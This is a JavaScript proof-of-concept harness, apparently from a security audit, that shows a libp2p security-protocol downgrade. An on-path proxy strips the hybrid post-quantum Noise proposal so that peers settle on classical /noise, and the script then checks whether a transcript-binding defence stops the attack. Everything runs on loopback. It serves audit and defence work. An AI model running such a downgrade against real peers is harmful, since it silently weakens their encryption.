// Demonstrates the libp2p security-protocol downgrade described in the audit
// finding A-1: two peers that both prefer the hybrid post-quantum encrypter
// (/noise-mlkem768-hfs/0.2.0) and also support classical /noise are silently
// forced onto /noise by an on-path attacker who strips the hybrid line from
// the plaintext multistream-select exchange.
//
// It runs three phases and prints them side by side:
//   1. baseline-direct : dialer -> listener, no intermediary. Confirms hybrid.
//   2. baseline-tap     : dialer -> passive relay -> listener. Same result,
//                         plus the multistream bytes captured on the wire.
//   3. attack           : dialer -> active on-path proxy -> listener. The proxy
//                         strips the hybrid proposal; both peers end on /noise.
//
// For each connected phase it records, on BOTH peers: the negotiated encrypter
// (connection.encryption), whether the mutually authenticated session actually
// works (an echo round-trip), the verified remote PeerId, and everything the
// peer store retains about the counterparty. Raw multistream transcripts are
// written to output/.
//
// Everything is on 127.0.0.1. No traffic leaves the loopback interface.

import { mkdirSync, writeFileSync, readFileSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { basename, dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { ensureNodeModules } from './setup.mjs'

const here = dirname(fileURLToPath(import.meta.url))
const outDir = resolve(here, 'output')
mkdirSync(outDir, { recursive: true })

// Link node_modules before importing anything that needs libp2p.
const link = ensureNodeModules()

const { multiaddr } = await import('@multiformats/multiaddr')
const { fromString } = await import('uint8arrays/from-string')
const { toString } = await import('uint8arrays/to-string')

function asBytes (data) {
  return data.subarray ? data.subarray() : data
}
const { startProxy, HYBRID_ID, CLASSICAL_ID } = await import('./proxy.mjs')
const { makeNode, ECHO_PROTOCOL } = await import('./nodes.mjs')
const { implDir } = await import('./impl-path.mjs')

// Provenance of the implementation under test, recorded WITHOUT any absolute
// local path (this output is committed to a public repo).
function readDepVersion (pkg) {
  try { return JSON.parse(readFileSync(resolve(implDir, 'node_modules', pkg, 'package.json'), 'utf8')).version } catch { return null }
}
function gitField (args) {
  try { return execFileSync('git', ['-C', implDir, ...args], { encoding: 'utf8' }).trim() } catch { return null }
}
const provenance = {
  implementation: basename(implDir),
  packageName: (() => { try { return JSON.parse(readFileSync(resolve(implDir, 'package.json'), 'utf8')).name } catch { return null } })(),
  packageVersion: (() => { try { return JSON.parse(readFileSync(resolve(implDir, 'package.json'), 'utf8')).version } catch { return null } })(),
  gitHead: gitField(['rev-parse', 'HEAD']),
  gitBranch: gitField(['rev-parse', '--abbrev-ref', 'HEAD']),
  gitClean: gitField(['status', '--porcelain']) === '',
  node: process.version,
  deps: {
    libp2p: readDepVersion('libp2p'),
    '@libp2p/tcp': readDepVersion('@libp2p/tcp'),
    '@chainsafe/libp2p-yamux': readDepVersion('@chainsafe/libp2p-yamux'),
    '@libp2p/crypto': readDepVersion('@libp2p/crypto'),
    '@libp2p/interface': readDepVersion('@libp2p/interface')
  }
}

const SEED_LISTENER = 0x11
const SEED_DIALER = 0x22

function tcpPortOf (ma) {
  const m = ma.toString().match(/\/tcp\/(\d+)/)
  if (m == null) throw new Error(`no tcp port in multiaddr ${ma.toString()}`)
  return Number(m[1])
}

async function echoRoundTrip (dialer, dialMa) {
  const stream = await dialer.dialProtocol(dialMa, ECHO_PROTOCOL)
  const msg = 'PING-downgrade-demo'
  const got = await new Promise((resolvePromise, rejectPromise) => {
    const timer = setTimeout(() => rejectPromise(new Error('echo timeout')), 8000)
    stream.addEventListener('message', (evt) => {
      clearTimeout(timer)
      resolvePromise(toString(asBytes(evt.data)))
      stream.close().catch(() => {})
    })
    stream.addEventListener('close', (evt) => {
      if (evt.error != null) { clearTimeout(timer); rejectPromise(evt.error) }
    })
    stream.send(fromString(msg))
  })
  return { sent: msg, received: got, ok: got === msg }
}

function peerSnapshot (peer) {
  if (peer == null) return null
  return {
    id: peer.id.toString(),
    protocols: peer.protocols,
    addresses: peer.addresses.map(a => a.multiaddr.toString()),
    metadataKeys: [...peer.metadata.keys()],
    tagKeys: [...peer.tags.keys()],
    hasPeerRecordEnvelope: peer.peerRecordEnvelope != null,
    // Fields that WOULD reveal a downgrade if libp2p recorded them:
    recordsEncrypter: 'encryption' in peer || 'securityProtocol' in peer,
    recordsNoiseStaticKey: 'noiseStaticKey' in peer
  }
}

async function safeGet (node, peerId) {
  try { return peerSnapshot(await node.peerStore.get(peerId)) } catch { return null }
}

async function runPhase (mode) {
  // Phases suffixed -defended enable transcript-bound negotiation on both
  // peers; everything else about the phase is unchanged.
  const defended = mode.endsWith('-defended')
  const listener = await makeNode({ seedByte: SEED_LISTENER, listen: true, defended })
  const dialer = await makeNode({ seedByte: SEED_DIALER, listen: false, defended })

  // Echo handler proves the resulting session is a working, muxed,
  // mutually-authenticated channel.
  // Handler signature is positional: (stream, connection).
  await listener.handle(ECHO_PROTOCOL, (stream) => {
    stream.addEventListener('message', (evt) => {
      try { stream.send(asBytes(evt.data)) } catch { /* buffer full / closed */ }
    })
  })

  const listenMa = listener.getMultiaddrs()[0]
  const listenerId = listener.peerId.toString()
  const dialerId = dialer.peerId.toString()

  let proxy = null
  let dialMa = listenMa
  if (mode !== 'baseline-direct') {
    const attack = mode.startsWith('attack')
    proxy = await startProxy({ targetPort: tcpPortOf(listenMa), attack })
    dialMa = multiaddr(`/ip4/127.0.0.1/tcp/${proxy.port}/p2p/${listenerId}`)
  }

  const result = { mode, defended, listenerId, dialerId }

  try {
    const conn = await dialer.dial(dialMa)
    let echo
    try {
      echo = await echoRoundTrip(dialer, dialMa)
    } catch (echoErr) {
      echo = { ok: false, error: String(echoErr && echoErr.message ? echoErr.message : echoErr) }
    }

    // Dialer's local view.
    const dialerView = {
      encryption: conn.encryption,
      remotePeer: conn.remotePeer.toString(),
      remotePeerMatchesListener: conn.remotePeer.toString() === listenerId
    }

    // Listener's local view of the same connection.
    const inbound = listener.getConnections().find(c => c.remotePeer.toString() === dialerId)
    const listenerView = inbound == null
      ? null
      : {
          encryption: inbound.encryption,
          remotePeer: inbound.remotePeer.toString(),
          remotePeerMatchesDialer: inbound.remotePeer.toString() === dialerId
        }

    // Peer-store contents on both sides (detection channel 3).
    const dialerPeerStore = await safeGet(dialer, listener.peerId)
    const listenerPeerStore = await safeGet(listener, dialer.peerId)

    result.connected = true
    result.dialerView = dialerView
    result.listenerView = listenerView
    result.echo = echo
    result.peerStore = { dialerRecordsListener: dialerPeerStore, listenerRecordsDialer: listenerPeerStore }
    result.agreedEncrypter = dialerView.encryption
    result.bothOnHybrid = dialerView.encryption === HYBRID_ID && listenerView?.encryption === HYBRID_ID
    result.bothOnClassical = dialerView.encryption === CLASSICAL_ID && listenerView?.encryption === CLASSICAL_ID
  } catch (err) {
    result.connected = false
    result.error = String(err && err.message ? err.message : err)
  }

  if (proxy != null) {
    result.wireTranscript = proxy.transcript
    result.proxyMode = proxy.mode
    writeFileSync(
      resolve(outDir, `transcript-${mode}.json`),
      JSON.stringify(proxy.transcript, null, 2)
    )
  }

  await dialer.stop()
  await listener.stop()
  if (proxy != null) await proxy.close()

  return result
}

function fmtWire (transcript) {
  if (transcript == null) return '    (no intermediary; nothing observed on the wire)'
  return transcript.map(e => {
    if (e.action === 'rewrite') return `    [${e.dir}] REWRITE "${e.from}" -> "${e.to}"`
    if (e.action === 'forward') return `    [${e.dir}] forward  "${e.protocol}"`
    if (e.action === 'relay-start') return `    [${e.dir}] (raw relay from here: ${e.note})`
    if (e.action === 'error') return `    [${e.dir}] ERROR ${e.note}`
    return `    [${e.dir}] ${JSON.stringify(e)}`
  }).join('\n')
}

function printPhase (r) {
  console.log(`\n=== PHASE: ${r.mode} ===`)
  if (!r.connected) {
    console.log(`  connection FAILED: ${r.error}`)
    return
  }
  console.log(`  negotiated encrypter (dialer view)   : ${r.dialerView.encryption}`)
  console.log(`  negotiated encrypter (listener view) : ${r.listenerView?.encryption}`)
  console.log(`  dialer verified remote == listener   : ${r.dialerView.remotePeerMatchesListener}`)
  console.log(`  listener verified remote == dialer   : ${r.listenerView?.remotePeerMatchesDialer}`)
  console.log(`  echo round-trip over the session     : ${r.echo.ok ? 'OK ("' + r.echo.received + '")' : 'FAILED (' + r.echo.error + ')'}`)
  console.log(`  both peers on hybrid                 : ${r.bothOnHybrid}`)
  console.log(`  both peers on classical /noise       : ${r.bothOnClassical}`)
  console.log('  peer store (dialer\'s record of listener):')
  console.log('    ' + JSON.stringify(r.peerStore.dialerRecordsListener))
  console.log('  peer store (listener\'s record of dialer):')
  console.log('    ' + JSON.stringify(r.peerStore.listenerRecordsDialer))
  console.log('  multistream-select wire observation:')
  console.log(fmtWire(r.wireTranscript))
}

// ---- run ----
console.log('libp2p security-protocol downgrade demonstration (loopback only)')
console.log(`implementation under test : ${provenance.packageName}@${provenance.packageVersion} (${provenance.implementation})`)
console.log(`  git                     : ${provenance.gitBranch} @ ${provenance.gitHead} (${provenance.gitClean ? 'clean' : 'DIRTY'})`)
console.log(`  node / libp2p           : ${provenance.node} / libp2p@${provenance.deps.libp2p}`)
console.log(`node_modules link         : ${link.created ? 'created' : 'pre-existing'} (-> implementation node_modules)`)
console.log(`hybrid protocol id        : ${HYBRID_ID}`)
console.log(`classical protocol id     : ${CLASSICAL_ID}`)

const phases = ['baseline-direct', 'baseline-tap', 'attack', 'baseline-tap-defended', 'attack-defended']
const results = []
for (const mode of phases) {
  results.push(await runPhase(mode))
}
for (const r of results) printPhase(r)

// ---- verdict ----
const baseline = results.find(r => r.mode === 'baseline-tap')
const attack = results.find(r => r.mode === 'attack')
console.log('\n=== VERDICT ===')
const downgradeSucceeded = baseline?.bothOnHybrid === true && attack?.connected === true && attack?.bothOnClassical === true
if (downgradeSucceeded) {
  console.log('  DOWNGRADE SUCCEEDED: both peers negotiated the hybrid encrypter when unobstructed,')
  console.log('  and both silently completed a mutually authenticated CLASSICAL /noise session when the')
  console.log('  on-path proxy stripped the hybrid proposal. Neither peer signalled an error.')
} else {
  console.log('  Downgrade did NOT reproduce as predicted. See per-phase results above (this is a finding, not a failure).')
}

// ---- does the defence stop it? ----
const defendedBaseline = results.find(r => r.mode === 'baseline-tap-defended')
const defendedAttack = results.find(r => r.mode === 'attack-defended')
const defenceHolds = defendedBaseline?.bothOnHybrid === true && defendedAttack?.connected === false
console.log('\n=== VERDICT: transcript-bound negotiation ===')
if (defenceHolds) {
  console.log('  DEFENCE HOLDS: with the binding enabled both peers still negotiate the hybrid')
  console.log('  encrypter when unobstructed, and the same on-path attack no longer produces a')
  console.log('  session at all. The downgraded handshake is refused rather than completed.')
  console.log(`  refusal seen by the dialer: ${defendedAttack?.error}`)
} else if (defendedBaseline?.bothOnHybrid !== true) {
  console.log('  INCONCLUSIVE: the defended baseline did not reach the hybrid encrypter, so the')
  console.log('  attack phase proves nothing. See the per-phase results above.')
} else {
  console.log('  DEFENCE DID NOT HOLD: the attack still produced a completed session with the')
  console.log('  binding enabled. See the per-phase results above (this is a finding, not a failure).')
}

const summary = {
  when: new Date().toISOString(),
  provenance,
  hybridId: HYBRID_ID,
  classicalId: CLASSICAL_ID,
  downgradeSucceeded,
  defenceHolds,
  results
}
writeFileSync(resolve(outDir, 'results.json'), JSON.stringify(summary, null, 2))
console.log(`\nRaw results written to output/results.json and output/transcript-*.json`)
process.exit(0)
